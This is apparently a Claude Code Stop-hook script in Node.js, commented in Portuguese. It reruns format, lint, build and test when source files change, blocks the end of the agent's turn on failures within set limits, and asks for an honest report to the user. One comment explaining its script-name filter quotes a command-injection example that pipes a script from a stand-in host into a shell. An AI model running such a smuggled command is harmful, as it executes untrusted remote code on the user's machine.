#!/usr/bin/env node

// why: o agente pode ler, buscar e explorar o repo a vontade - o que ele nao pode e encerrar a
// tarefa deixando lint/build/teste quebrados. Por isso o gate roda no evento Stop e SO quando
// algo mudou dentro dos caminhos observados (default: src). Tirar duvida ou navegar no codigo
// nao dispara build nenhum.
//
// hazard: um gate de Stop e um loop por construcao - ele bloqueia o fim do turno e o agente
// volta a trabalhar. Todo o controle de parada (tentativas, orcamento de tempo, teto de
// bloqueios) existe para esse loop terminar SEMPRE, com relatorio, em vez de prender o agente.
// O proprio Claude Code tem um teto seu: apos 8 bloqueios consecutivos ele ignora o hook e
// encerra o turno. MAX_BLOCKS (default 6) fica abaixo disso de proposito, para o hook desistir
// com relatorio antes de o runtime desistir sem explicar nada.

import { spawnSync } from 'node:child_process';
import { createHash } from 'node:crypto';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';

const DEFAULT_PATHS = 'src';
const DEFAULT_FORMAT = 'format';
const DEFAULT_COMMANDS = 'lint,build,test';
const DEFAULT_MAX_ATTEMPTS = '3';
const DEFAULT_BUDGET_SEC = '900';
const DEFAULT_COMMAND_TIMEOUT_SEC = '300';
const DEFAULT_MAX_BLOCKS = '6';
const DEFAULT_NOTIFY = 'always';

// why: varrer node_modules/dist/coverage para decidir "o que mudou" custaria mais que rodar o
// build - e nada ali e fonte editada pelo agente.
const SKIP_DIRS = new Set([
  'node_modules',
  '.git',
  'dist',
  'build',
  'out',
  'coverage',
  '.next',
  '.turbo',
  '.cache',
]);

const MAX_FINGERPRINT_FILES = 20000;
const REASON_MAX_CHARS = 7000;
const DETAIL_MAX_LINES = 30;
const DETAIL_MAX_CHARS = 1400;
const STATE_TTL_MS = 24 * 60 * 60 * 1000;

// why: o usuario escreve o caminho como `/src`, `./src` ou `src\` - os tres significam a mesma
// pasta do repo. Normalizar aqui evita que a config "certa" nao case com nada.
function normalizeRelPath(value) {
  return String(value)
    .replace(/\\/g, '/')
    .replace(/^\.\//, '')
    .replace(/^\/+/, '')
    .replace(/\/+$/, '');
}

function parseList(value) {
  return String(value)
    .split(',')
    .map((item) => item.trim())
    .filter(Boolean);
}

function parseNumber(value, fallback) {
  const parsed = Number.parseFloat(String(value));
  return Number.isFinite(parsed) && parsed >= 0 ? parsed : Number.parseFloat(fallback);
}

// why: nao existe campo `env` por hook no settings.json do Claude Code. A configuracao chega
// entao por argumento de linha de comando (`args`, forma exec, sem shell no meio), e a env var
// continua valendo como segunda opcao - e o que os selftests usam.
function flagValue(name) {
  const prefix = `--${name}=`;
  const hit = process.argv.slice(2).find((arg) => arg.startsWith(prefix));
  return hit === undefined ? undefined : hit.slice(prefix.length);
}

// hazard: `??` em toda a cadeia, nunca `||` - um valor vazio (`--commands=`) precisa significar
// "nao rode nenhuma verificacao", e nao "cai no default".
function setting(flag, envName, fallback) {
  return flagValue(flag) ?? process.env[envName] ?? fallback;
}

const PATHS = parseList(setting('paths', 'VERIFY_CHANGES_PATHS', DEFAULT_PATHS)).map(
  normalizeRelPath,
);
const FORMAT_SCRIPT = String(setting('format', 'VERIFY_CHANGES_FORMAT', DEFAULT_FORMAT)).trim();
const COMMANDS = parseList(setting('commands', 'VERIFY_CHANGES_COMMANDS', DEFAULT_COMMANDS));
const MAX_ATTEMPTS = parseNumber(
  setting('max-attempts', 'VERIFY_CHANGES_MAX_ATTEMPTS', DEFAULT_MAX_ATTEMPTS),
  DEFAULT_MAX_ATTEMPTS,
);
const BUDGET_MS =
  parseNumber(
    setting('budget-sec', 'VERIFY_CHANGES_BUDGET_SEC', DEFAULT_BUDGET_SEC),
    DEFAULT_BUDGET_SEC,
  ) * 1000;
const COMMAND_TIMEOUT_MS =
  parseNumber(
    setting(
      'command-timeout-sec',
      'VERIFY_CHANGES_COMMAND_TIMEOUT_SEC',
      DEFAULT_COMMAND_TIMEOUT_SEC,
    ),
    DEFAULT_COMMAND_TIMEOUT_SEC,
  ) * 1000;
const MAX_BLOCKS = parseNumber(
  setting('max-blocks', 'VERIFY_CHANGES_MAX_BLOCKS', DEFAULT_MAX_BLOCKS),
  DEFAULT_MAX_BLOCKS,
);
// `always` = avisa em todo encerramento, inclusive quando nao rodou nada; `on-run` = so quando
// executou algum comando; `on-error` = so quando falhou.
const NOTIFY = String(setting('notify', 'VERIFY_CHANGES_NOTIFY', DEFAULT_NOTIFY)).trim();
const STATE_DIR = setting(
  'state-dir',
  'VERIFY_CHANGES_STATE_DIR',
  path.join(os.tmpdir(), 'claude-verify-changes'),
);

// --- impressao digital dos caminhos observados ---------------------------------------------

function walk(dir, out) {
  if (out.length > MAX_FINGERPRINT_FILES) return out;
  let entries;
  try {
    entries = fs.readdirSync(dir, { withFileTypes: true });
  } catch {
    return out;
  }
  for (const entry of entries.sort((a, b) => (a.name < b.name ? -1 : 1))) {
    const full = path.join(dir, entry.name);
    if (entry.isDirectory()) {
      if (!SKIP_DIRS.has(entry.name)) walk(full, out);
    } else if (entry.isFile()) {
      out.push(full);
    }
  }
  return out;
}

// why: hash de CONTEUDO, nao de mtime. O `format` reescreve arquivos e mexe no mtime sem mudar
// nada semantico - com mtime o hook se auto-dispararia em loop depois de cada prettier.
function fingerprint(cwd, relPaths) {
  const hash = createHash('sha1');
  let files = 0;
  for (const rel of relPaths) {
    const abs = path.resolve(cwd, rel);
    let stat = null;
    try {
      stat = fs.statSync(abs);
    } catch {
      hash.update(`${rel}:absent\n`);
      continue;
    }
    const list = stat.isDirectory() ? walk(abs, []) : [abs];
    for (const file of list) {
      files += 1;
      const key = path.relative(cwd, file).split(path.sep).join('/');
      try {
        hash.update(`${key}:${createHash('sha1').update(fs.readFileSync(file)).digest('hex')}\n`);
      } catch {
        hash.update(`${key}:unreadable\n`);
      }
    }
  }
  return { hash: hash.digest('hex'), files };
}

// why: fallback para sessao retomada (ou hook instalado no meio da sessao), quando nao existe
// baseline do sessionStart. Depois da primeira rodada o baseline passa a existir e o git sai
// do caminho.
function gitDirty(cwd, relPaths) {
  const proc = spawnSync('git', ['status', '--porcelain', '--', ...relPaths], {
    cwd,
    encoding: 'utf8',
    shell: false,
    timeout: 15000,
  });
  if (proc.error || proc.status !== 0 || typeof proc.stdout !== 'string') return null;
  return proc.stdout.trim() !== '';
}

// --- estado por sessao -----------------------------------------------------------------------

// hazard: a chave e o CWD, nunca o sessionId - verificado em 2026-09-15. O `sessionId` do
// agentStop as vezes vem com o id da tool call (`call_S2a2584krvQiQjfrF3TS7dnA`) em vez do id da
// sessao. Com ele na
// chave, o estado se espalha por varios arquivos: o baseline do sessionStart fica invisivel (e
// todo encerramento cai no fallback do git, rodando a suite inteira a toa) e o contador de
// tentativas nunca passa de 1 - foi o que produziu "tentativa 1 de 3" tres vezes seguidas.
function stateFileOf(_sessionId, cwd) {
  const key = createHash('sha1').update(String(cwd)).digest('hex').slice(0, 16);
  return path.join(STATE_DIR, `${key}.json`);
}

function emptyState() {
  return {
    baseline: null,
    attempts: 0,
    blocks: 0,
    spentMs: 0,
    failing: false,
    pendingReport: false,
    disarmedReported: false,
    errorReported: false,
    updatedAt: Date.now(),
  };
}

function loadState(file) {
  try {
    const parsed = JSON.parse(fs.readFileSync(file, 'utf8'));
    return { ...emptyState(), ...parsed };
  } catch {
    return emptyState();
  }
}

// why: devolve se REALMENTE gravou. Os avisos de "uma vez so" (gate desarmado, hook quebrado)
// dependem da marca sobreviver ao proximo encerramento - se o disco recusou, bloquear de novo
// repetiria o aviso a cada turno. Quem nao consegue gravar a marca nao bloqueia.
function saveState(file, state) {
  try {
    fs.mkdirSync(path.dirname(file), { recursive: true });
    fs.writeFileSync(file, JSON.stringify({ ...state, updatedAt: Date.now() }));
    return true;
  } catch {
    // hazard: sem estado o hook ainda funciona - ele so perde a contagem de tentativas e passa
    // a depender do teto do runtime. Falhar aqui travaria o turno por um detalhe de disco.
    return false;
  }
}

function pruneState() {
  try {
    const now = Date.now();
    for (const name of fs.readdirSync(STATE_DIR)) {
      const file = path.join(STATE_DIR, name);
      if (now - fs.statSync(file).mtimeMs > STATE_TTL_MS) fs.rmSync(file, { force: true });
    }
  } catch {
    // diretorio ainda nao existe, ou nao ha o que limpar
  }
}

// --- execucao dos comandos -------------------------------------------------------------------

function packageScripts(cwd) {
  try {
    const parsed = JSON.parse(fs.readFileSync(path.join(cwd, 'package.json'), 'utf8'));
    return parsed && typeof parsed.scripts === 'object' && parsed.scripts !== null
      ? parsed.scripts
      : {};
  } catch {
    return null;
  }
}

function stripNoise(text) {
  return String(text ?? '')
    .replace(/\r\n/g, '\n')
    .replace(/\[[0-9;]*[A-Za-z]/g, '')
    .trimEnd();
}

function tail(text) {
  const clean = stripNoise(text);
  if (clean === '') return '';
  let out = clean.split('\n').slice(-DETAIL_MAX_LINES).join('\n');
  if (out.length > DETAIL_MAX_CHARS) out = `...${out.slice(-DETAIL_MAX_CHARS)}`;
  return out;
}

// hazard: o nome do script vem de env (`VERIFY_CHANGES_COMMANDS`) e e concatenado numa linha de
// shell. Sem esta peneira, um nome como `lint && curl evil.sh | sh` viraria execucao - e npm
// nunca teve script com esses caracteres, entao restringir nao custa nada.
const SCRIPT_NAME = /^[A-Za-z0-9][A-Za-z0-9:_.-]*$/;

function runScript(script, cwd, timeoutMs) {
  const started = Date.now();
  // hazard: `shell: true` com array de args e deprecado no Node 24 (DEP0190) porque os args nao
  // sao escapados, so concatenados - passar a linha pronta e o caminho suportado. E o shell e
  // obrigatorio: no Windows `npm` e um .cmd e o spawn direto falha com EINVAL.
  const proc = spawnSync(`npm run ${script}`, {
    cwd,
    encoding: 'utf8',
    shell: true,
    timeout: Math.max(1000, timeoutMs),
    maxBuffer: 20 * 1024 * 1024,
    env: { ...process.env, CI: '1', FORCE_COLOR: '0', NO_COLOR: '1', NODE_NO_WARNINGS: '1' },
  });
  const durationMs = Date.now() - started;
  const output = `${stripNoise(proc.stdout)}\n${stripNoise(proc.stderr)}`.trim();

  if (proc.error && (proc.error.code === 'ETIMEDOUT' || proc.signal)) {
    return { script, status: 'timeout', durationMs, output, exit: null };
  }
  if (proc.error) {
    return { script, status: 'error', durationMs, output: proc.error.message, exit: null };
  }
  if (proc.status !== 0) {
    return { script, status: 'failed', durationMs, output, exit: proc.status };
  }
  return { script, status: 'ok', durationMs, output, exit: 0 };
}

function verify(cwd, state) {
  const scripts = packageScripts(cwd);
  if (scripts === null) return null;

  // why: o `format` vem primeiro para o resultado final ja sair no padrao do projeto - rodar
  // depois do lint so geraria um segundo diff a verificar.
  const planned = [FORMAT_SCRIPT, ...COMMANDS].filter(Boolean);
  const results = [];
  let spentMs = 0;

  for (const script of planned) {
    // why: o requisito e rodar TODOS e reportar cada um - nao para no primeiro erro, senao o
    // agente descobre as falhas uma por turno.
    if (!SCRIPT_NAME.test(script)) {
      results.push({ script, status: 'invalid', durationMs: 0, output: '', exit: null });
      continue;
    }
    if (!Object.prototype.hasOwnProperty.call(scripts, script)) {
      results.push({ script, status: 'missing', durationMs: 0, output: '', exit: null });
      continue;
    }
    const remainingMs = BUDGET_MS - state.spentMs - spentMs;
    if (remainingMs <= 0) {
      results.push({ script, status: 'skipped', durationMs: 0, output: '', exit: null });
      continue;
    }
    const result = runScript(script, cwd, Math.min(COMMAND_TIMEOUT_MS, remainingMs));
    spentMs += result.durationMs;
    results.push(result);
  }

  return { results, spentMs };
}

// --- relatorio -------------------------------------------------------------------------------

function seconds(ms) {
  return `${(ms / 1000).toFixed(1)}s`;
}

function describe(result) {
  switch (result.status) {
    case 'ok':
      return `OK (${seconds(result.durationMs)})`;
    case 'failed':
      return `FALHOU exit ${result.exit} (${seconds(result.durationMs)})`;
    case 'timeout':
      return `TIMEOUT depois de ${seconds(result.durationMs)}`;
    case 'error':
      return 'ERRO AO INICIAR o processo';
    case 'missing':
      return `NAO EXECUTADO: o script "${result.script}" nao existe no package.json`;
    case 'skipped':
      return 'NAO EXECUTADO: orcamento de tempo da verificacao esgotado';
    case 'invalid':
      return `NAO EXECUTADO: "${result.script}" nao e um nome valido de script npm (config do hook)`;
    default:
      return String(result.status);
  }
}

// why: script inexistente NAO e falha - o requisito e nao travar o agente por causa dele, so
// avisar. Timeout e erro de spawn, sim, sao falha: o comando existe e nao passou.
function isBlocking(result) {
  return result.status === 'failed' || result.status === 'timeout' || result.status === 'error';
}

function summaryTable(results) {
  const width = Math.max(...results.map((result) => result.script.length));
  return results
    .map((result) => `  npm run ${result.script.padEnd(width)}  ->  ${describe(result)}`)
    .join('\n');
}

function details(results) {
  return results
    .filter(isBlocking)
    .map((result) => {
      const excerpt = tail(result.output);
      return `--- saida de \`npm run ${result.script}\` ---\n${excerpt === '' ? '(sem saida)' : excerpt}`;
    })
    .join('\n\n');
}

function buildReason(head, results, guidance) {
  const parts = [head, summaryTable(results), details(results), guidance].filter(
    (part) => part !== '',
  );
  const reason = parts.join('\n\n');
  if (reason.length <= REASON_MAX_CHARS) return reason;
  // hazard: motivo gigante pode ser truncado pelo runtime pelo FIM - e o fim e justamente a
  // instrucao do que fazer. Corta o miolo (as saidas) e preserva cabecalho + guidance.
  return [head, summaryTable(results), '(saidas omitidas por tamanho)', guidance].join('\n\n');
}

const NO_CHEATING =
  'Nao desative regra de lint, nao marque teste como skip, nao use ts-ignore/any e nao altere ' +
  'arquivo de configuracao (eslint/jest/prettier/tsconfig) para fazer passar - corrija o codigo.';

function fixGuidance(attempt) {
  return (
    'O que fazer agora: corrija as falhas acima e so entao encerre - esta verificacao roda de ' +
    `novo sozinha no proximo encerramento. ${NO_CHEATING} Esta e a tentativa ${attempt} de ` +
    `${MAX_ATTEMPTS}; esgotadas as tentativas o hook para de bloquear e voce tera de reportar ` +
    'as falhas restantes ao usuario.'
  );
}

const FINAL_GUIDANCE =
  'O que fazer agora: PARE de tentar corrigir - o limite de tentativas/tempo da verificacao foi ' +
  'atingido e este hook nao vai bloquear de novo. Encerre agora e, na sua resposta final ao ' +
  'usuario, alem da resposta normal, informe em texto claro: (1) todas as verificacoes que ' +
  'rodaram nesta etapa e o resultado de cada uma, (2) as que falharam, com o motivo, (3) as que ' +
  'nao rodaram porque o script nao existe no package.json, (4) o que fica pendente por causa ' +
  'disso. Quem decide o proximo passo e o humano.';

const SUCCESS_GUIDANCE =
  'O que fazer agora: nao ha nada a corrigir. Encerre agora e, na sua resposta final ao usuario, ' +
  'alem da resposta normal, inclua este relatorio: cada verificacao que rodou nesta etapa com o ' +
  'seu resultado, e as que nao rodaram porque o script nao existe no package.json.';

// why: o usuario quer saber em TODO encerramento se a verificacao rodou ou nao - silencio e
// ambiguo (nao da para distinguir "nada a verificar" de "o hook nao esta carregado"). Por isso
// o aviso de "nao rodou" e curto e manda o agente NAO refazer nada: ele custa uma linha, nao
// um turno de trabalho.
// why: desarmar calado e o pior silencio possivel - a partir dali nada mais e verificado, e a
// sessao fica identica a uma em que tudo passou. O usuario precisa saber que perdeu a rede.
function disarmedNotice() {
  return [
    `[verify-changes] Status da verificacao neste encerramento: o gate SE DESARMOU apos ` +
      `${MAX_BLOCKS} bloqueios nesta sessao. Daqui para frente nenhum encerramento sera ` +
      'verificado automaticamente.',
    'O que fazer agora: nao refaca nada. Encerre informando ao usuario, em uma linha, que o gate ' +
      'se desarmou e que lint/build/test NAO estao mais sendo verificados neste ponto da sessao - ' +
      'para ter garantia ele precisa rodar os comandos na mao ou abrir uma sessao nova.',
  ].join('\n\n');
}

// why: mesma logica - um hook que quebrou e indistinguivel de um hook que aprovou. Como o
// proprio hook esta com defeito, o aviso sai UMA vez e depois ele se cala de vez.
function errorNotice(detail) {
  return [
    `[verify-changes] Status da verificacao neste encerramento: o hook QUEBROU e nao executou ` +
      `nada - ${detail}.`,
    'O que fazer agora: nao refaca nada e nao tente consertar o hook por conta propria. Encerre ' +
      'informando ao usuario, em uma linha, que a verificacao automatica falhou por erro interno ' +
      'e que lint/build/test NAO foram executados neste encerramento.',
  ].join('\n\n');
}

function skipNotice(detail) {
  const planned = [FORMAT_SCRIPT, ...COMMANDS].filter(Boolean);
  return [
    `[verify-changes] Status da verificacao neste encerramento: NENHUM comando executado - ${detail}.`,
    planned.length > 0
      ? `Comandos que rodariam se houvesse alteracao: npm run ${planned.join(', npm run ')}.`
      : '',
    'O que fazer agora: nao refaca nada, nao repita a resposta anterior e nao rode esses ' +
      'comandos por conta propria. Apenas encerre acrescentando UMA linha curta de status ao ' +
      'usuario, no formato: "Verificacoes: nenhuma executada - <motivo acima>."',
  ]
    .filter((part) => part !== '')
    .join('\n\n');
}

// --- decisao ---------------------------------------------------------------------------------

// hazard: um decide() duplo emitiria dois JSON no mesmo stdout e o runtime leria o primeiro (ou
// nenhum). Toda saida de decisao passa por aqui e so a primeira vale.
let decided = false;

function emitBlock(reason) {
  if (decided) return;
  decided = true;
  // why: em Stop, `{ decision: 'block', reason }` vai no TOPO do objeto - e o unico dos quatro
  // hooks cuja decisao nao mora dentro de `hookSpecificOutput`.
  //
  // hazard: exit 0 junto. Em Stop o exit 2 tambem bloqueia, mas ai a mensagem passa a vir do
  // stderr e o turno e marcado como erro de hook; com exit 0 o `reason` chega limpo ao agente.
  process.stdout.write(`${JSON.stringify({ decision: 'block', reason })}\n`);
}

// why: liberar deixando rastro, em vez de sair calado. Silencio e indistinguivel de hook morto,
// de crash e de timeout, e o `systemMessage` faz o log de debug registrar que o hook rodou,
// olhou e decidiu liberar - que e o rastro que faltava para depurar "o hook nao fez nada".
//
// hazard: `{ decision: 'allow' }` NAO existe no schema de Stop: o objeto reprova a validacao e
// o turno ganha um aviso de "hook error" a toa. Em Stop, liberar e simplesmente nao mandar
// `decision`.
//
// hazard: a nota vai em `systemMessage`, nunca em `reason` nem em `additionalContext`. Os dois
// ultimos CONTINUAM a conversa no Claude Code, entao um texto de diagnostico viraria trabalho
// para o agente; `systemMessage` em Stop so vai para o log de debug.
function emitAllow(note) {
  if (decided) return;
  decided = true;
  const payload = note ? { systemMessage: `[verify-changes] ${note}` } : {};
  process.stdout.write(`${JSON.stringify(payload)}\n`);
}

function onSessionStart(payload) {
  const cwd = payload.cwd ?? process.cwd();
  const sessionId = payload.sessionId ?? payload.session_id ?? 'unknown';
  pruneState();

  // why: o baseline nasce aqui. Sem ele, um repo que ja esta sujo (o caso normal) faria toda
  // pergunta virar build - exatamente o incomodo que este hook deve evitar.
  const state = emptyState();
  state.baseline = fingerprint(cwd, PATHS).hash;
  saveState(stateFileOf(sessionId, cwd), state);

  const planned = [FORMAT_SCRIPT, ...COMMANDS].filter(Boolean);
  if (PATHS.length === 0 || planned.length === 0) return;

  // hazard: no Claude Code o `additionalContext` de SessionStart vive DENTRO de
  // `hookSpecificOutput`. No topo do objeto ele reprova a validacao de schema e o aviso nao
  // chega ao agente - ele comecaria a sessao sem saber que existe um gate no encerramento.
  process.stdout.write(
    `${JSON.stringify({
      hookSpecificOutput: {
        hookEventName: 'SessionStart',
        additionalContext:
          `[verify-changes] Se esta sessao alterar algo em ${PATHS.join(', ')}, antes de encerrar o ` +
          `turno sera executado automaticamente: npm run ${planned.join(', npm run ')}. Falha ali ` +
          'bloqueia o encerramento ate voce corrigir, entao ja escreva o codigo formatado, sem ' +
          'erro de lint/tipo e com os testes passando.',
      },
    })}\n`,
  );
}

function onAgentStop(payload) {
  const cwd = payload.cwd ?? process.cwd();
  const sessionId = payload.sessionId ?? payload.session_id ?? 'unknown';
  const file = stateFileOf(sessionId, cwd);
  const state = loadState(file);

  if (PATHS.length === 0 || (COMMANDS.length === 0 && FORMAT_SCRIPT === '')) {
    emitAllow('gate desligado por configuracao (PATHS ou COMMANDS vazios)');
    return;
  }

  // hazard: `stop_hook_active` e o unico sinal de loop que NAO depende do arquivo de estado. Se
  // o runtime diz que este turno ja foi forcado a continuar e o nosso contador esta zerado, o
  // estado se perdeu no meio do ciclo (tmp limpo, sessionId novo) - e continuar contando do zero
  // somaria bloqueios nossos em cima dos que o runtime ja concedeu, empurrando para o teto de 8.
  const stopHookActive = payload.stop_hook_active === true || payload.stopHookActive === true;
  if (stopHookActive && state.blocks === 0) {
    state.blocks = Math.max(0, MAX_BLOCKS - 1);
    saveState(file, state);
  }

  // hazard: teto absoluto de bloqueios. Qualquer bug na contagem de tentativas para aqui, entao
  // o pior caso do hook e "ele desiste", nunca "ele prende o agente".
  if (state.blocks >= MAX_BLOCKS) {
    // why: o desarme custa UM bloqueio a mais que o teto (7 no default contra os 8 do runtime),
    // porque desarmar sem avisar deixa a sessao parecendo verificada quando nao esta mais.
    if (!state.disarmedReported) {
      state.disarmedReported = true;
      if (saveState(file, state)) {
        emitBlock(disarmedNotice());
        return;
      }
    }
    emitAllow(`teto de ${MAX_BLOCKS} bloqueios atingido nesta sessao; o gate esta desarmado`);
    return;
  }

  // hazard: `justReported` e o que impede o aviso de "nao rodou nada" de se auto-alimentar -
  // sem ele, o turno que entrega o aviso dispara outro aviso, e assim ate estourar MAX_BLOCKS.
  const justReported = state.pendingReport === true;
  if (justReported) {
    // why: o turno anterior foi gasto entregando o relatorio ao usuario - esse pedido ja foi
    // cumprido, nao pode virar motivo para bloquear de novo.
    state.pendingReport = false;
    saveState(file, state);
  }

  // why: um unico ponto de saida para os casos "nao rodou" - assim nenhum caminho silencioso
  // escapa do aviso, que e justamente o que o usuario nao consegue distinguir de hook morto.
  const notifySkip = (detail) => {
    if (NOTIFY !== 'always' || justReported) {
      emitAllow(`nenhum comando executado: ${detail}`);
      return;
    }
    state.pendingReport = true;
    state.blocks += 1;
    saveState(file, state);
    emitBlock(skipNotice(detail));
  };

  const current = fingerprint(cwd, PATHS);
  const changed =
    state.baseline === null ? (gitDirty(cwd, PATHS) ?? true) : current.hash !== state.baseline;

  // why: `failing` mantem o gate de pe quando o agente encerra SEM corrigir nada - sem isso,
  // bastaria parar de editar para escapar da verificacao que acabou de falhar.
  if (!changed && !state.failing) {
    if (state.baseline === null) state.baseline = current.hash;
    saveState(file, state);
    notifySkip(`nada mudou em ${PATHS.join(', ')} desde o inicio da sessao`);
    return;
  }

  const run = verify(cwd, state);
  if (run === null) {
    // sem package.json legivel nao ha o que verificar
    notifySkip('nao foi possivel ler o package.json na raiz do projeto');
    return;
  }

  state.spentMs += run.spentMs;
  // why: baseline pos-execucao - o `format` acabou de reescrever arquivos, e isso nao pode
  // contar como "o agente mexeu de novo" no proximo encerramento.
  state.baseline = fingerprint(cwd, PATHS).hash;

  const failed = run.results.filter(isBlocking);

  if (failed.length === 0) {
    state.failing = false;
    state.attempts = 0;
    state.pendingReport = NOTIFY !== 'on-error';
    state.blocks += state.pendingReport ? 1 : 0;
    saveState(file, state);
    if (!state.pendingReport) {
      emitAllow('verificacao executada sem falhas; relatorio omitido por NOTIFY=on-error');
      return;
    }
    emitBlock(
      buildReason(
        `[verify-changes] Status da verificacao neste encerramento: EXECUTADA (alteracoes em ` +
          `${PATHS.join(', ')}), SEM falhas:`,
        run.results,
        SUCCESS_GUIDANCE,
      ),
    );
    return;
  }

  state.attempts += 1;
  const outOfBudget = state.spentMs >= BUDGET_MS;
  const exhausted = state.attempts >= MAX_ATTEMPTS || outOfBudget;
  state.failing = !exhausted;
  state.pendingReport = exhausted;
  state.blocks += 1;
  saveState(file, state);

  const head = exhausted
    ? '[verify-changes] Status da verificacao neste encerramento: EXECUTADA e ainda COM FALHAS ' +
      `apos ${state.attempts} tentativa(s)` +
      `${outOfBudget ? ' e com o orcamento de tempo esgotado' : ''} - o hook para de bloquear aqui:`
    : `[verify-changes] Status da verificacao neste encerramento: EXECUTADA (alteracoes em ` +
      `${PATHS.join(', ')}), COM FALHAS (tentativa ${state.attempts} de ${MAX_ATTEMPTS}):`;

  emitBlock(
    buildReason(head, run.results, exhausted ? FINAL_GUIDANCE : fixGuidance(state.attempts)),
  );
}

function eventOf(payload) {
  // why: o mesmo script atende dois eventos. O `hook_event_name` do Claude Code e a fonte da
  // verdade; o `--event=` continua valendo para execucao manual e para os selftests.
  const name = String(payload.hook_event_name ?? payload.hookEventName ?? '').toLowerCase();
  if (name === 'sessionstart') return 'sessionStart';
  if (name === 'stop' || name === 'subagentstop' || name === 'agentstop') return 'agentStop';
  const flag = process.argv.find((arg) => arg.startsWith('--event='));
  if (flag) return flag.slice('--event='.length);
  // why: o SessionStart traz `reason` (startup/resume/clear/...). Alguns runtimes usam `source`
  // no lugar; qualquer um dos dois, sem nome de evento, so pode ser inicio de sessao.
  if (payload.reason !== undefined || payload.source !== undefined) return 'sessionStart';
  return 'agentStop';
}

async function readStdin() {
  const chunks = [];
  for await (const chunk of process.stdin) chunks.push(Buffer.from(chunk));
  return Buffer.concat(chunks).toString('utf8');
}

// hazard: process.exit() pode truncar o stdout no Windows - o script nunca chama, so define
// exitCode e deixa o Node dar flush no JSON da decisao.
// why: guardado fora do try para o catch saber em qual projeto o hook quebrou - sem o cwd nao
// da para achar o estado e o aviso de falha viraria repeticao a cada encerramento.
let lastPayload = null;

try {
  const raw = (await readStdin()).trim();
  if (raw !== '') {
    let payload = null;
    try {
      payload = JSON.parse(raw);
    } catch {
      payload = null;
    }
    lastPayload = payload;
    if (payload !== null && typeof payload === 'object') {
      if (eventOf(payload) === 'sessionStart') onSessionStart(payload);
      else onAgentStop(payload);
    } else {
      // hazard: ao contrario de preToolUse (fail-closed), aqui payload ilegivel LIBERA - sem
      // saber o que rodou nao ha base para exigir correcao, e prender o turno por isso seria
      // pior que nao ter o gate.
      emitAllow('payload de Stop ilegivel; encerramento liberado sem verificacao');
    }
  }
} catch (error) {
  const detail = `${error?.name ?? 'Error'}: ${error?.message ?? ''}`;

  // why: hook quebrado e indistinguivel de hook que aprovou - e o usuario acha que esta coberto
  // quando nao esta. Entao a falha vira um aviso pelo agente, UMA vez por sessao.
  try {
    const file = stateFileOf(null, lastPayload?.cwd ?? process.cwd());
    const state = loadState(file);
    // hazard: so bloqueia se a marca foi REALMENTE gravada. Se o defeito for justamente no
    // disco, repetir o aviso a cada encerramento transformaria a falha em loop.
    if (!state.errorReported) {
      state.errorReported = true;
      if (saveState(file, state)) emitBlock(errorNotice(detail));
    }
  } catch {
    // estado inutilizavel; resta o fail-open silencioso abaixo
  }

  // hazard: Stop e fail-open de proposito. Se o proprio hook quebra, ele SAI DO CAMINHO -
  // um gate de qualidade com bug nao pode impedir o agente de entregar a resposta. Este
  // emitAllow e no-op quando o aviso acima ja decidiu.
  emitAllow(
    `falha interna do hook (${detail}); o encerramento seguiu sem verificacao. Avise o humano ` +
      'para revisar .claude/hooks/verify-changes/verify-changes.mjs',
  );
}

process.exitCode ??= 0;
